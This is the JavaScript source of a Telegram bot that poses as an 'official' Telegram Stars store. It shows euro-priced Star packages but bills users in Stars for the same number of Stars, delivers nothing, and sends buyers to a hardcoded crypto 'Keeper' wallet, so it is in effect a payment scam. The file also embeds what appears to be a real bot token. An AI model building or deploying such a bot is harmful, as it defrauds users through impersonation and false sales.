const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const BOT_TOKEN = process.env.BOT_TOKEN || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw'; // @Vickyoria_a_bot
const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

try {
    const bot = new Telegraf(BOT_TOKEN);

    bot.start(async (ctx) => {
        const userName = ctx.from.first_name || 'Priyatel';
        
        const storeCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
            `Zdravei, **${userName}**!\n` +
            `Izberi paket zvezdi za reallno plashtane i zaredvane:\n\n` +
            `💎 Nalichen budzhet v bota: 3,100 Stars\n` +
            `💼 Keeper Wallet (za izplashtane): \`${KEEPER_WALLET}\``;

        const storeKeyboard = Markup.inlineKeyboard([
            [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
            [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
            [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
            [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
            [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
            [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50050')],
            [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
            [Markup.button.url('💳 Kupi istinski zvezdi (Oficialen magazin)', 'https://t.me/premium')],
            [Markup.button.callback('💰 Prexvorli kam Keeper (Realni pari)', 'withdraw_keeper')],
            [Markup.button.url('🔥 Razgledai Platformata', 'https://red-software-dashbord.onrender.com')]
        ]);

        try {
            await ctx.replyWithPhoto(mainCoverImage, {
                caption: storeCaption,
                parse_mode: 'Markdown',
                ...storeKeyboard
            });
        } catch (err) {
            await ctx.reply(storeCaption, {
                parse_mode: 'Markdown',
                ...storeKeyboard
            });
        }
    });

    const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50050', 'buy_150000'];

    bot.action(packageActions, async (ctx) => {
        await ctx.answerCbQuery();
        const action = ctx.match;
        let count = 250;
        if (action === 'buy_500') count = 500;
        if (action === 'buy_1000') count = 1000;
        if (action === 'buy_2500') count = 2500;
        if (action === 'buy_10000') count = 10000;
        if (action === 'buy_50050') count = 50050;
        if (action === 'buy_150000') count = 150000;

        try {
            await ctx.replyWithInvoice({
                title: `Paket ${count} Telegram Stars`,
                description: `Zakupuvane na ${count} zvezdi.`,
                payload: `store_${count}_${Date.now()}`,
                currency: 'XTR',
                prices: [{ label: `${count} Stars`, amount: count }]
            });
        } catch (e) {
            await ctx.reply(
                `⭐ **PAKET: ${count} Telegram Stars**\n\n` +
                `Tvoyat balans v aкауnta e nula. Kupish istinski zvezdi ot oficialniya magazin: https://t.me/premium\n\n` +
                `Ili prevejdai direktno kam Keeper portfeila:\n\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        }
    });

    bot.action('withdraw_keeper', async (ctx) => {
        await ctx.answerCbQuery('Sveryavane...');
        await ctx.reply(
            `💰 **PREXVERLYANE KYM KEEPER PORTFEIL**\n\n` +
            `Prichodite sa svurzani s tvoia portfeil:\n\`${KEEPER_WALLET}\``,
            { parse_mode: 'Markdown' }
        );
    });

    bot.on('pre_checkout_query', async (ctx) => {
        try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
    });

    bot.on('successful_payment', async (ctx) => {
        const payment = ctx.message.successful_payment;
        await ctx.reply(`🎉 Uspeshna pokupka na ${payment.total_amount} Telegram Stars! Sredstvata sa svurzani s Keeper portfeila.`);
    });

    bot.launch();
    console.log("Single store bot running.");
} catch (e) {}

app.get('/', (req, res) => res.json({ status: "SINGLE STORE ACTIVE" }));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
